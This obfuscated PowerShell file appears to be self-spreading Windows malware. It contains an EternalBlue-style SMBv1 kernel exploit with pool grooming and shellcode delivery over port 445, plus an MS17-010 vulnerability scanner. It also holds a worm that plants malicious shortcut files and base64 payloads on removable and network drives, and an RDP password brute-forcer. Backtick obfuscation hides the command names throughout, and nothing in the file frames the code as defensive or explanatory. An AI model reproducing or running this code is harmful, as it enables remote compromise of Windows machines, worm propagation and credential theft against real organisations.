    $pkt += 0x49,0x01,0x01,0x00  
    $pkt += 0x1e,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x1e,0x00,0x00,0x00 
    $pkt += 0x4c,0x00,0x00,0x00 
    $pkt += 0x49,0x01,0x00,0x00 
    $pkt += 0x6c,0x00,0x00,0x00
    $pkt += 0x01
    $pkt += 0x00,0x00  
    $pkt += 0x00,0x00 
    $pkt += 0x6a,0x01 
    $pkt += 0xff
    $pkt += [Byte[]] (0x00) * 0x1e 
    $pkt += 0xff,0xff,0x00,0x00,0x01
    $pkt += [Byte[]](0x00) * 0x146
    $len = $pkt.Length - 4
    $hexlen = [bitconverter]::GetBytes($len)[-2..-4]
    $pkt[1] = $hexlen[0]
    $pkt[2] = $hexlen[1]
    $pkt[3] = $hexlen[2]
    return $pkt
  }
  
function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) {
    
    $timeout = ($timeout * 0x10) + 1
    [Byte[]]  $pkt = [Byte[]] (0x00)
    $pkt += 0x00,0x10,0x38 
    $pkt += 0xff,0x53,0x4D,0x42 
    $pkt += 0x33
    $pkt += 0x00,0x00,0x00,0x00 
    $pkt += 0x18
    $pkt += 0x01,0x48
    $pkt += 0x00,0x00 
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00 
    $pkt += 0x00,0x00
    $pkt += $tree_id 
    $pkt += 0x2f,0x4b
    $pkt += $user_id 
    $pkt += 0x00,0x00 

    $pkt += 0x09   
    $pkt += 0x00,0x00    
    $pkt += 0x00,0x10  
    $pkt += 0x00,0x00 
    $pkt += 0x00,0x00
    $pkt += 0x00 
    $pkt += 0x00 
    $pkt += 0x00,0x10  
    $pkt += 0x38,0x00,0x49
    $pkt += [bitconverter]::GetBytes($timeout)[0]
    $pkt += 0x00,0x00 
    $pkt += 0x03,0x10

    $pkt += 0xff,0xff,0xff  
    $pkt +=$data  
    $len = $pkt.Length - 4
    $hexlen = [bitconverter]::GetBytes($len)[-2..-4]
    $pkt[1] = $hexlen[0]
    $pkt[2] = $hexlen[1]
    $pkt[3] = $hexlen[2]    
    return $pkt    
}   
    
function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk){

    $nt_trans_pkt = M`A`ke_`sMb1_`Nt_tRaNS_`pA`C`kET8 $smbheader.tree_id $smbheader.user_id
    $sock.Send($nt_trans_pkt) | OuT`-`NUll

    $raw, $transheader = sMb1`_gET_R`eS`PONsE8($sock)
    if (!($transheader.error_class -eq 0x00 -and ($transheader.reserved1 -eq 0x00) -and ($transheader.error_code[0] -eq 0x00) -and ($transheader.error_code[1] -eq 0x00)))
    {
    return -1,-1
    }
    
    $i=$firstDataFragmentSize
    $timeout=0
    while ($i -lt $data.count)
    {
        $sendSize=[System.Math]::Min(4096,($data.count-$i))
        if (($data.count-$i) -le 4096){
         if (!$sendLastChunk)
            { break }
         }
        $trans2_pkt = m`Ak`E_Smb1_Tr`ANs2_EX`P`Loi`T_PaCKeT8 $smbheader.tree_id $smbheader.user_id $data[$i..($i+$sendSize-1)] $timeout
        $sock.Send($trans2_pkt) | oUT`-NU`lL
        $timeout+=1
        $i +=$sendSize
    } 
    if ($sendLastChunk)
    {Smb1_gET_rEsP`ON`s`e8($sock) }
    return $i,$timeout
}
function createSessionAllocNonPaged8($target, $size) {
   $client = NEW-o`B`JECT System.Net.Sockets.TcpClient($target,445)
   $sock = $client.Client
   ClI`eNt`_`NEgOt`IaTe8 $sock $false | Ou`T`-nuLl
   $flags2=16385
   if ($size -ge 0xffff)
   { $reqsize=$size /2}
   else
   {
     $flags2 =49153
     $reqsize= $size
   }
    
    $a=[bitconverter]::GetBytes($reqsize)
    $b=[bitconverter]::GetBytes($flags2)
    $pkt =  maK`E_`s`mB1`_frE`E`_Ho`LE_S`ESsi`ON_PAcK`Et8 ($b[0],$b[1]) (0x02,0x00) ($a[0],$a[1],0x00,0x00,0x00)

    $sock.Send($pkt) | O`Ut-NULL
    SmB`1_`GeT_RE`SpOnS`E8($sock) | Ou`T-`NuLl
    return $sock
}
function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os) { 
     
    [Byte[]] $pkt = 0x00       
    $pkt += 0x00,0x00,0x51      
    $pkt += 0xff,0x53,0x4D,0x42      
    $pkt += 0x73   
    $pkt += 0x00,0x00,0x00,0x00 
    $pkt += 0x18 
    $pkt += $flags2  
    $pkt += 0x00,0x00 
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0xff,0xff 
    $pkt += 0x2f,0x4b
    $pkt += 0x00,0x00  
    $pkt += 0x00,0x00  
    $pkt += 0x0c 
    $pkt += 0xff  
    $pkt += 0x00  
    $pkt += 0x00,0x00   
    $pkt += 0x00,0xf0 
    $pkt += 0x02,0x00 
    $pkt += $vcnum  
    $pkt += 0x00,0x00,0x00,0x00  
    $pkt += 0x00,0x00    
    $pkt += 0x00,0x00,0x00,0x00 
    $pkt += 0x40,0x00,0x00,0x80  
    $pkt += 0x16,0x00     
    $pkt += $native_os
    $pkt += [Byte[]] (0x00) * 17  
    return $pkt
  }

function make_smb2_payload_headers_packet8($for_nx){
    [Byte[]] $pkt = [Byte[]](0x00,0x00,0x81,0x00) + [system.Text.Encoding]::ASCII.GetBytes(('BA'+'AD')) 
    if ($for_nx){ $pkt+=[Byte[]](0x00)*123 }
    else{ $pkt+=[Byte[]](0x00)*124  }
    return $pkt
}

function eb8($target,$sc) {  
    $NTFEA_SIZE8 = 0x9000
	$ntfea9000=[byte[]]0x00*0xbe0
	$ntfea9000 +=0x00,0x00,0x5c,0x73+[byte[]]0x00*0x735d
	$ntfea9000 +=0x00,0x00,0x47,0x81+[byte[]]0x00*0x8148
	
    $TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000
    $SHELLCODE_PAGE_ADDR =  0xffffffffffd04000
    $PTE_ADDR=0xfffff6ffffffe820

    $fakeSrvNetBufferX64Nx =@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x
00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0
x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa8,0xe7,0xff,0xff,0xff,0xf6,0xff,0xff)

    [byte[]]$feaListNx=[byte[]](0x00,0x00,0x01,0x00)
    $feaListNx += $ntfea9000
    $feaListNx +=0x00,0x00,0xaf,0x00+ $fakeSrvNetBufferX64Nx
    $feaListNx +=0x12,0x34,0x78,0x56
    [byte[]]$fake_recv_struct=@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x58,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x58,0x40,0xd0,0xff,0x
ff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0
x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0
0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x41,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x7e,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x
00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x41,0xd0,0xff,0xff,0xff,0xff,0xff)
    $feaList = cREAtE`FEaL`i`S`T8 $sc.length  $ntfea9000  

    $client = New-`OB`jecT System.Net.Sockets.TcpClient($target,445)  
    $sock = $client.Client
    cLIENT_n`E`Got`IATE8 $sock $true | Out`-n`ULl
    $raw, $smbheader = S`mB1_lOg`In8 $sock
    $os=[system.Text.Encoding]::ascii.GetString($raw[45..($raw.count-1)]).ToLower()
	if ($os.contains(('wi'+'nd'+'ows 10 ')))
    {
        $b=[int]$os.split(" ")[-1]
        if ($b -ge 14393) {return $False}
    }
		
    if (!(($os.contains(('wi'+'ndows '+'8'))) -or ($os.contains(('win'+'dow'+'s')) -and $os.contains(('20'+'12')))))
    {return $False}
	$sock.ReceiveTimeout =5000 
    $raw, $smbheader = Tree_CONNE`cT_`AN`dX8 $sock $target $smbheader.user_id
     
     
    $progress , $timeout= s`END_bI`G_tRAn`S28 $sock $smbheader $feaList ($feaList.length%4096) $False  
    if (($progress -eq -1) -and ($timeout -eq -1))
    {return $false}
    
    $client2 = neW-obJ`e`CT System.Net.Sockets.TcpClient($target,445)  
    $sock2 = $client2.Client
    cL`i`Ent_`NeGotiat`e8 $sock2 $true | O`U`T-NulL
    $raw, $smbheader_t = smB1_`L`OGIN8 $sock2
    $raw, $smbheader2 = Tr`ee_cO`N`NeCt_AN`DX8 $sock2 $target $smbheader_t.user_id
    $progress2 , $timeout2= SEn`D`_big_TrANS`28 $sock2 $smbheader2 $feaListNx ($feaList.length%4096) $False  
    if (($progress2 -eq -1) -and ($timeout2 -eq -1))
    {return $false}
    
    
    $allocConn = cr`e`A`TESesSIO`N`AllOCN`onpa`GED8 $target ($NTFEA_SIZE8 - 0x2010)   
     
     $payload_hdr_pkt = MAK`E_s`Mb`2_`pAYLOaD_Hea`ders`_pAcKe`T8($true)
     $groom_socks =@()
     for ($i=0; $i -lt 13; $i++)
     {
        $client = ne`W-Obj`e`ct System.Net.Sockets.TcpClient($target,445)
        $client.NoDelay = $true
        $gsock = $client.Client
        $groom_socks += $gsock
        $gsock.Send($payload_hdr_pkt) | o`Ut`-Null  
     }
    $holeConn = CReaT`e`Ses`SiO`NaLLoCnONPaGed8 $target ($NTFEA_SIZE8 - 0x10)
    $allocConn.close()
    for ($i=0; $i -lt 5; $i++)
     {
         $client = N`EW-ObJ`ect System.Net.Sockets.TcpClient($target,445)
         $client.NoDelay = $true
         $gsock = $client.Client    
         $groom_socks += $gsock
         $gsock.Send($payload_hdr_pkt) | o`Ut-null  
     }
    $holeConn.close()
    
    $trans2_pkt2 = mAkE_Sm`B1_TRaNS2`_E`X`pLoit_pA`C`ket8 $smbheader2.tree_id $smbheader2.user_id $feaListNx[$progress2..$feaListNx.count] $timeout2
    $sock2.Send($trans2_pkt2) | ouT-n`U`ll
    $raw2, $transheader2 = sMB1_`geT`_RE`sP`o`NSE8($sock2)
    if ($raw2 -eq -1 -and ($transheader2 -eq -1)){return $false}
    foreach ($sk in $groom_socks)
    {
        $sk.Send([byte[]]0x00) | Ou`T-Null
    }
    
    $trans2_pkt =MAKE_Sm`B1_TRa`N`S2_eXP`Lo`I`T_`Pa`CKE`T8 $smbheader.tree_id $smbheader.user_id $feaList[$progress..$feaList.count] $timeout
    $sock.Send($trans2_pkt) | o`UT`-NuLL
    $raw, $transheader = smB`1_GET`_Re`spo`NSE8($sock)
    if ($raw -eq -1 -and ($transheader -eq -1)){return $false}
    foreach ($sk in $groom_socks)
    {
        $sk.Send($fake_recv_struct + $sc) | oU`T`-NUll
    }
     foreach ($sk in $groom_socks)
    {
        $sk.close() | oU`T-`NulL
    }
    $sock.Close()| Out-`N`ULL
    return $true  
  }
  
$Source = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace PingCastle.Scanners
{
	public class m17sc
	{
		static public bool Scan(string computer)
		{
			TcpClient client = new TcpClient();
			client.Connect(computer, 445);
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] negotiatemessage = GetNegotiateMessage();
				stream.Write(negotiatemessage, 0, negotiatemessage.Length);
				stream.Flush();
				byte[] response = ReadSmbResponse(stream);
				if (!(response[8] == 0x72 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid negotiate response");
				}
				byte[] sessionSetup = GetR(response);
				stream.Write(sessionSetup, 0, sessionSetup.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (!(response[8] == 0x73 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid sessionSetup response");
				}
				byte[] treeconnect = GetTreeConnectAndXRequest(response, computer);
				stream.Write(treeconnect, 0, treeconnect.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (!(response[8] == 0x75 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid TreeConnect response");
				}
				byte[] peeknamedpipe = GetPeekNamedPipe(response);
				stream.Write(peeknamedpipe, 0, peeknamedpipe.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (response[8] == 0x25 && response[9] == 0x05 && response[10] ==0x02 && response[11] ==0x00 && response[12] ==0xc0 )
				{
					return true;
				}
			}
			catch (Exception)
			{
				throw;
			}
			return false;
		}

		private static byte[] ReadSmbResponse(NetworkStream stream)
		{
			byte[] temp = new byte[4];
			stream.Read(temp, 0, 4);
			int size = temp[3] + temp[2] * 0x100 + temp[3] * 0x10000;
			byte[] output = new byte[size + 4];
			stream.Read(output, 4, size);
			Array.Copy(temp, output, 4);
			return output;
		}

		static byte[] GetNegotiateMessage()
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00, 
				0xff,0x53,0x4d,0x42, 
				0x72, 
				0x00, 
				0x00,
				0x00,0x00, 
				0x18, 
				0x01,0x28, 
				0x00,0x00, 
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00, 
				0x00,0x00, 
				0x44,0x6d, 
				0x00,0x00, 
				0x42,0xc1, 
				0x00, 
				0x31,0x00,
				0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x31,0x2e,0x30,0x00, 
				0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,0x32,0x00, 
				0x02,0x4e,0x54,0x20,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x20,0x31,0x2e,0x30,0x00, 
				0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00, 
			};
			return EncodeNetBiosLength(output);
		}

		static byte[] GetR(byte[] data)
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00, 
				0xff,0x53,0x4d,0x42, 
				0x73, 
				0x00, 
				0x00, 
				0x00,0x00, 
				0x18, 
				0x01,0x28, 
				0x00,0x00, 
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 
				0x00,0x00, 
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1, 
				0x0d, 
				0xff, 
				0x00, 
				0x00,0x00, 
				0xdf,0xff, 
				0x02,0x00,
				0x01,0x00, 
				0x00,0x00,0x00,0x00, 
				0x00,0x00, 
				0x00,0x00, 
				0x00,0x00,0x00,0x00, 
				0x40,0x00,0x00,0x00, 
				0x26,0x00, 
				0x00,
				0x2e,0x00, 
				0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x32,0x31,0x39,0x35,0x00, 
				0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x35,0x2e,0x30,0x00 
			};
			return EncodeNetBiosLength(output);
		}

		private static byte[] EncodeNetBiosLength(byte[] input)
		{
			byte[] len = BitConverter.GetBytes(input.Length-4);
			input[3] = len[0];
			input[2] = len[1];
			input[1] = len[2];
			return input;
		}

		static byte[] GetTreeConnectAndXRequest(byte[] data, string computer)
		{
			MemoryStream ms = new MemoryStream();
			BinaryReader reader = new BinaryReader(ms);
			byte[] part1 = new byte[] {
				0x00,0x00,0x00,0x00, 
				0xff,0x53,0x4d,0x42, 
				0x75, 
				0x00, 
				0x00, 
				0x00,0x00, 
				0x18, 
				0x01,0x28, 
				0x00,0x00, 
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00, 
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1, 
				0x04, 
				0xff, 
				0x00, 
				0x00,0x00, 
				0x00,0x00, 
				0x01,0x00, 
				0x19,0x00, 
				0x00, 
				0x5c,0x5c};
			byte[] part2 = new byte[] {
				0x5c,0x49,0x50,0x43,0x24,0x00, 
				0x3f,0x3f,0x3f,0x3f,0x3f,0x00
			};
			ms.Write(part1, 0, part1.Length);
			byte[] encodedcomputer = new ASCIIEncoding().GetBytes(computer);
			ms.Write(encodedcomputer, 0, encodedcomputer.Length);
			ms.Write(part2, 0, part2.Length);
			ms.Seek(0, SeekOrigin.Begin);
			byte[] output = reader.ReadBytes((int) reader.BaseStream.Length);
			return EncodeNetBiosLength(output);
		}

		static byte[] GetPeekNamedPipe(byte[] data)
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00, 
				0xff,0x53,0x4d,0x42,
				0x25, 
				0x00,
				0x00, 
				0x00,0x00, 
				0x18, 
				0x01,0x28, 
				0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 
				0x00,0x00, 
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1,
				0x10, 
				0x00,0x00, 
				0x00,0x00, 
				0xff,0xff, 
				0xff,0xff, 
				0x00, 
				0x00, 
				0x00,0x00,
				0x00,0x00,0x00,0x00, 
				0x00,0x00, 
				0x00,0x00, 
				0x4a,0x00, 
				0x00,0x00,
				0x4a,0x00, 
				0x02,
				0x00, 
				0x23,0x00, 
				0x00,0x00, 
				0x07,0x00, 
				0x5c,0x50,0x49,0x50,0x45,0x5c,0x00 
			};
			return EncodeNetBiosLength(output);
		}
	}
}
"@
aD`d-TY`pe -TypeDefinition $Source

$source1=@"
using System;
using System.Threading;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Reflection;
namespace USB
{
public class USBLNK
    {
        public static List<string> blacklist = new List<string>();
		public static string gb3;
		public static string gb6;
        const string home = "UTFsync";
        const string inf_data = "\\inf_data";
        static public void Main1(string b1, string b2)
        {
			gb3 = b1;
			gb6 = b2;
            Timer timer = new Timer(ResetBlacklist, null, 10000, 10000);
            while (true)
            {
                BaseMode();
                Thread.Sleep(5000);
            }
        }
		static void ResetBlacklist(object state) {
            blacklist.Clear();
        }
		static bool CreateHomeDirectory(string drive)
        {
            try
            {
                DirectoryInfo directoryInfo = Directory.CreateDirectory(drive + home);
                directoryInfo.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                return true;
            }
            catch{}
            return false;
        }
		static bool IsSupported(DriveInfo drive) { return drive.IsReady && drive.AvailableFreeSpace > 1024
            && (drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.Network)
            && (drive.DriveFormat == "FAT32" || drive.DriveFormat == "NTFS");}
		static bool CheckBlacklist(string name) { return name==home || name=="System Volume Information" || name=="$RECYCLE.BIN";}
		static bool Infect(string drive)
        {
            if (blacklist.Contains(drive)) {return true;}
			CreateLnk(drive, "blue3.bin", gb3);
			CreateLnk(drive, "blue6.bin", gb6);
			
            try
            {
                File.Create(drive + home + inf_data);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
			
            return false;
        }
		static bool CreateLnk(string drive, string binfname, string gb)
		{
			
			byte[] bytes1 = new byte[]{0x4c,0x00,0x00,0x00,0x01,0x14,0x02,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x81,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x
00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x9c,0x00,0x14,0x00,0x1f,0x80,0x20,0x20,0xec,0x21,0xea,0x3a,0x69,0x10,0xa2,0xdd,0x08,0x00,0x2b,0x30,0x30,0x9d,0x86,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x6a,0x00,0x00,0x00,0x00,0x00,0x00};
			
			byte[] bytes2 = new byte[]{0x3a,0x00,0x5c};
			byte[] bytes3 = new byte[]{0x00,0x00,0x00,0x46,0x00,0x6c,0x00,0x61,0x00,0x73,0x00,0x68,0x00,0x20,0x00,0x50,0x00,0x6c,0x00,0x61,0x00,0x79,0x00,0x65,0x00,0x72,0x00,0x00,0x00,0x4d,0x00,0x61,0x00,0x6e,0x00,0x61,0x00,0x67,0x00,0x65,0x00,0x20,0x00,0x46,0x00,0x6c,0x00,0x
61,0x00,0x73,0x00,0x68,0x00,0x20,0x00,0x50,0x00,0x6c,0x00,0x61,0x00,0x79,0x00,0x65,0x00,0x72,0x00,0x20,0x00,0x53,0x00,0x65,0x00,0x74,0x00,0x74,0x00,0x69,0x00,0x6e,0x00,0x67,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x05,0x00,0x00,0xa0,0x03,0x00,0x00,0x00
,0x14,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
			

			for(char i = 'D'; i <= 'K'; i++)
            {
				FileStream fs = new FileStream(drive+i.ToString()+binfname.Replace(".bin",".lnk"), FileMode.Create);
				fs.Write(bytes1,0,bytes1.Length);
				
				byte[] d = new byte[4]; 
				int l = binfname.Length+4;
				d[0] = (byte) (l & 0xFF); 
				d[1] = (byte) ((l & 0xFF00) >> 8); 
				d[2] = 0x0d; 
				d[3] = 0x00;
				fs.Write(d,0,d.Length);
				
				byte[] b = new byte[2]; 
				b[0] = (byte) (i & 0xFF); 
				b[1] = (byte) ((i & 0xFF00) >> 8); 
				fs.Write(b,0,b.Length);
				fs.Write(bytes2,0,bytes2.Length);
				
				foreach(char c in binfname){
					byte[] bb = new byte[2]; 
					bb[0] = (byte) ((c & 0xFF00) >> 8); 
					bb[1] = (byte) (c & 0xFF); 
					fs.Write(bb,0,bb.Length);
				}
				fs.Write(bytes3,0,bytes3.Length);
				
				fs.Close();
			}
			
			FileStream fs1 = new FileStream(drive+binfname, FileMode.Create);
			byte[] gb_bytes = Convert.FromBase64String(gb);
			fs1.Write(gb_bytes,0,gb_bytes.Length);
			fs1.Close();
			Console.WriteLine(gb_bytes.Length);
			return true;
		}
		static void BaseMode()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in drives)
            {
                if (blacklist.Contains(drive.Name))
                {    continue;}
				Console.WriteLine("Detect drive:"+drive.Name);
                if (IsSupported(drive))
                {
                    if (!File.Exists(drive + home + inf_data))
                    {
						Console.WriteLine("Try to infect "+drive.Name);
                        if (CreateHomeDirectory(drive.Name) && Infect(drive.Name))
                        {
                            blacklist.Add(drive.Name);
                        }
                    }
                    else {
						Console.WriteLine(drive.Name+" already infected!");
                        blacklist.Add(drive.Name);
					}
                }
                else{
                    blacklist.Add(drive.Name);
				}
            }
        }
    }
}
"@
Start-Job -ScriptBlock { aDd-TYpe -TypeDefinition $($args[0]);[USB.USBLNK]::Main1($($args[1]),$($args[2])) } -ArgumentList $source1,$blue3_bin_b64,$blue6_bin_b64


$source2=@"
using System;
using System.Threading;
using System.Drawing;
using System.Diagnostics;
using System.ComponentModel;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Collections;
using System.Reflection;

namespace RDP
{
    public class BRUTE
    {
		private int flag=-1;
		private bool check_login;
		private Process process;
		
		public void exit(){
			if(!process.HasExited){
				process.Kill();
			};
			process.Close();
		}
        public int check(string exePath, string ip, string user, string pass, bool checklogin)
        {	
			try{
				check_login = checklogin;
				process = new System.Diagnostics.Process();
				process.StartInfo.FileName = exePath;
				if(checklogin){
					process.StartInfo.Arguments = "/u:"+user+" /p:"+pass+" /cert-ignore /sec:nla /log-level:trace /size:700x700 /v:"+ip;
				} else {
					process.StartInfo.Arguments = "/u:"+user+" /p:"+pass+" /cert-ignore +auth-only /sec:nla /log-level:trace /v:"+ip;
				}
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.RedirectStandardOutput = true;
				process.Start();
				process.BeginOutputReadLine();
				process.OutputDataReceived += new DataReceivedEventHandler(processOutputDataReceived);
				System.Threading.Timer timer = new System.Threading.Timer(autoQuite, null, 5000, 5000);
				while(true){
					if(process.HasExited){return 0;}
					Thread.Sleep(1000);
					if(flag!=-1) {
						if(!checklogin){exit();}
						return flag;
					}
				}
			}
			catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
				return 0;
            }
			
        }
		private void autoQuite(object state) {
            flag=0;
        }
		

        private void processOutputDataReceived(object sender, DataReceivedEventArgs e)
        {
			try{
				if(check_login) {
					if(e.Data.Contains("LogonInfoV2")){
						flag=1;
					}
				} else {
					if(e.Data.Contains("Server rdp encryption method")){
						flag = 1;
					} else if(e.Data.Contains("check_fds: transport_read_pdu() - -1")){
						flag = 0;
					}
				}
			}
			catch (Exception ex)
            {
				string a=ex.Message;
            }
        }
    }
	public class User32Helper {
		[DllImport("user32.dll")]
		public static extern int SetForegroundWindow(IntPtr point);
	}
	public class CMD {
		struct INPUT{public INPUTType type;public INPUTUnion Event;}

		[StructLayout(LayoutKind.Explicit)]
		struct INPUTUnion{
			[FieldOffset(0)]
			internal MOUSEINPUT mi;
			[FieldOffset(0)]
			internal KEYBDINPUT ki;
			[FieldOffset(0)]
			internal HARDWAREINPUT hi;
		}

		[StructLayout(LayoutKind.Sequential)]
		struct MOUSEINPUT{public int dx;public int dy;public int mouseData;public int dwFlags;public uint time;public IntPtr dwExtraInfo;}

		[StructLayout(LayoutKind.Sequential)]
		struct KEYBDINPUT{public ushort wVk;public ushort wScan;public KEYEVENTF dwFlags;public int time;public IntPtr dwExtraInfo;}

		[StructLayout(LayoutKind.Sequential)]
		struct HARDWAREINPUT{public int uMsg;public short wParamL;public short wParamH;}
		enum INPUTType : uint{INPUT_KEYBOARD = 1}
		[Flags]
		enum KEYEVENTF : uint{EXTENDEDKEY = 0x0001,KEYUP = 0x0002,SCANCODE = 0x0008,UNICODE = 0x0004}

		[DllImport("user32.dll", SetLastError = true)]
		static extern UInt32 SendInput(int numberOfInputs, INPUT[] inputs, int sizeOfInputStructure);
		[System.Runtime.InteropServices.DllImport("user32.dll")]
		internal static extern uint MapVirtualKey(uint uCode, uint uMapType);
		
		private static ArrayList GetKeysByChar(char c){  
  
			bool flag = c.ToString().ToLower()!=c.ToString();
			ArrayList ret_list = new ArrayList();
			Type type = typeof(Keys);
